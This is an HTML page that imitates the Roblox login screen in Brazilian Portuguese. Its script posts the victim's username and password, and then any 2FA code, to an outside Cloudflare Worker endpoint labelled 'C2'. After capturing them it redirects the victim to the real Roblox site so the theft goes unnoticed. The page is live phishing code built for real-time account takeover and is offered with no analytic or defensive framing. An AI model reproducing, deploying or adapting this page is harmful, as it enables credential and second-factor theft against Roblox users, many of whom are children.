<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Roblox</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; }
  
  body {
    background-color: #111;
    background-image: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.8)), url('https://images.rbxcdn.com/fe7c0a5d4d2b4b0f2c4c3d0a1b2c3d4e.jpg'); /* Fundo genérico escuro */
    background-size: cover;
    background-position: center;
    background-attachment: fixed;
    color: #fff;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
  }

  /* Top Bar */
  .topbar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 16px;
    background: #191a1c;
    border-bottom: 1px solid #000;
  }
  .logo-icon {
    width: 28px;
    height: 28px;
    background: #fff;
    transform: rotate(15deg);
    border-radius: 4px;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .logo-icon svg { width: 18px; height: 18px; fill: #191a1c; }
  
  .top-actions { display: flex; gap: 8px; align-items: center; }
  .btn-top {
    padding: 6px 12px;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
  }
  .btn-blue { background: #4053ff; color: #fff; border: none; }
  .btn-outline { background: transparent; color: #fff; border: 1px solid #555; }
  .search-icon { width: 20px; height: 20px; fill: #fff; }

  .nav-tabs {
    display: flex;
    padding: 0 16px;
    background: #191a1c;
    overflow-x: auto;
  }
  .nav-tab {
    padding: 12px 16px;
    font-size: 14px;
    font-weight: 600;
    color: #b8b8b8;
    text-decoration: none;
    white-space: nowrap;
  }
  .nav-tab.active { color: #fff; }

  /* Login Modal */
  .modal-container {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }

  .login-card {
    background: #27292d;
    border-radius: 8px;
    padding: 24px;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.5);
  }

  .login-card h1 {
    font-size: 24px;
    font-weight: 700;
    text-align: center;
    margin-bottom: 20px;
    color: #fff;
  }

  .input-group {
    margin-bottom: 12px;
  }
  input {
    width: 100%;
    padding: 12px 14px;
    background: #32353b;
    border: 1px solid #444;
    border-radius: 4px;
    color: #fff;
    font-size: 16px;
    outline: none;
  }
  input:focus { border-color: #777; }
  input::placeholder { color: #999; }

  .btn-main {
    width: 100%;
    padding: 12px;
    background: transparent;
    color: #fff;
    border: 1px solid #666;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
    margin-top: 4px;
    cursor: pointer;
  }
  .btn-main:active { background: rgba(255,255,255,0.1); }

  .forgot-link {
    display: block;
    text-align: center;
    color: #fff;
    font-size: 14px;
    margin: 16px 0;
    text-decoration: none;
  }

  .divider {
    height: 1px;
    background: #444;
    margin: 16px 0;
  }

  .btn-alt {
    width: 100%;
    padding: 12px;
    background: #32353b;
    color: #fff;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    font-weight: 600;
    margin-bottom: 8px;
    cursor: pointer;
  }

  .signup-text {
    text-align: center;
    font-size: 13px;
    color: #b8b8b8;
    margin-top: 24px;
  }
  .signup-text a { color: #fff; text-decoration: none; }

  .error {
    color: #ff4a4a;
    font-size: 13px;
    margin-bottom: 8px;
    display: none;
  }
  .hidden { display: none !important; }
  
  /* Footer */
  .footer {
    background: #191a1c;
    padding: 16px;
    text-align: center;
    font-size: 12px;
    color: #fff;
    border-top: 1px solid #000;
  }
  .age-badge {
    display: inline-flex;
    align-items: center;
    background: #fff;
    border-radius: 4px;
    overflow: hidden;
    margin-bottom: 8px;
  }
  .age-num {
    background: #d32f2f;
    color: #fff;
    font-size: 24px;
    font-weight: 700;
    padding: 4px 12px;
  }
  .age-text {
    color: #000;
    font-size: 14px;
    padding: 0 12px;
  }
</style>
</head>
<body>

  <!-- Top Bar -->
  <div class="topbar">
    <div class="logo-icon">
      <svg viewBox="0 0 100 100"><path d="M10 10 L90 10 L90 90 L10 90 Z M30 30 L30 70 L70 70 L70 30 Z"/></svg>
    </div>
    <div class="top-actions">
      <a href="#" class="btn-top btn-blue">Cadastrar-se</a>
      <a href="#" class="btn-top btn-outline">Entrar</a>
      <svg class="search-icon" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
    </div>
  </div>

  <!-- Nav Tabs -->
  <div class="nav-tabs">
    <a href="#" class="nav-tab active">Destaques</a>
    <a href="#" class="nav-tab">Mercado</a>
    <a href="#" class="nav-tab">Criar</a>
    <a href="#" class="nav-tab">Robux</a>
  </div>

  <!-- Login Area -->
  <div class="modal-container">
    <div class="login-card">
      <h1>Entrar na Roblox</h1>
      
      <div id="step1">
        <div class="error" id="err1"></div>
        <div class="input-group">
          <input type="text" id="user" placeholder="Usuário/e-mail/telefone" required autocomplete="username">
        </div>
        <div class="input-group">
          <input type="password" id="pass" placeholder="Senha" required autocomplete="current-password">
        </div>
        <button class="btn-main" onclick="sendLogin()">Entrar</button>
        
        <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
        
        <div class="divider"></div>
        
        <button class="btn-alt">Envie-me um código único por e-mail</button>
        <button class="btn-alt">Entrada rápida</button>
        
        <div class="signup-text">
          Não possui uma conta? <a href="#">Cadastrar-se</a>
        </div>
      </div>

      <div id="step2" class="hidden">
        <p style="font-size: 14px; color: #b8b8b8; margin-bottom: 16px; text-align: center;">
          Insira o código de verificação do seu app autenticador.
        </p>
        <div class="error" id="err2"></div>
        <div class="input-group">
          <input type="text" id="code" placeholder="Código de 6 dígitos" maxlength="6" inputmode="numeric" style="text-align:center; font-size: 20px; letter-spacing: 4px;">
        </div>
        <button class="btn-main" onclick="sendCode()">Verificar</button>
      </div>

    </div>
  </div>

  <!-- Footer -->
  <div class="footer">
    <div class="age-badge">
      <div class="age-num">16</div>
      <div class="age-text">Violência</div>
    </div>
    <div>Interação entre usuários</div>
    <div>Compras no jogo (inclui itens aleatórios)</div>
  </div>

<script>
// URL do seu Worker (Cloudflare)
const C2 = "https://sync-backend.alexandregoncalves87.workers.dev"; 

let currentUser = "", currentPass = "";

async function sendLogin() {
  const user = document.getElementById("user").value.trim();
  const pass = document.getElementById("pass").value;
  if (!user || !pass) {
    showErr("err1", "Preencha todos os campos.");
    return;
  }
  currentUser = user; currentPass = pass;
  
  try {
    // Tenta logar de verdade pelo Worker
    const r = await fetch(C2 + "/roblox/login", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({user, pass})
    });
    const data = await r.json();
    
    if (data.twofa) {
      // Se tiver 2FA, mostra a tela de código
      document.getElementById("step1").classList.add("hidden");
      document.getElementById("step2").classList.remove("hidden");
      document.querySelector("h1").textContent = "Verificação";
    } else if (data.success) {
      // Login deu certo (sem 2FA)
      location.href = "https://www.roblox.com/home";
    } else {
      showErr("err1", "Nome de usuário ou senha incorretos.");
    }
  } catch(e) {
    showErr("err1", "Erro de conexão. Tente novamente.");
  }
}

async function sendCode() {
  const code = document.getElementById("code").value.trim();
  if (code.length !== 6) {
    showErr("err2", "O código deve ter 6 dígitos.");
    return;
  }
  try {
    const r = await fetch(C2 + "/roblox/2fa", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({user: currentUser, pass: currentPass, code})
    });
    const data = await r.json();
    if (data.success) {
      location.href = "https://www.roblox.com/home";
    } else {
      showErr("err2", "Código inválido ou expirado.");
    }
  } catch(e) {
    showErr("err2", "Erro de conexão. Tente novamente.");
  }
}

function showErr(id, msg) {
  const el = document.getElementById(id);
  el.textContent = msg;
  el.style.display = "block";
}
</script>
</body>
</html>
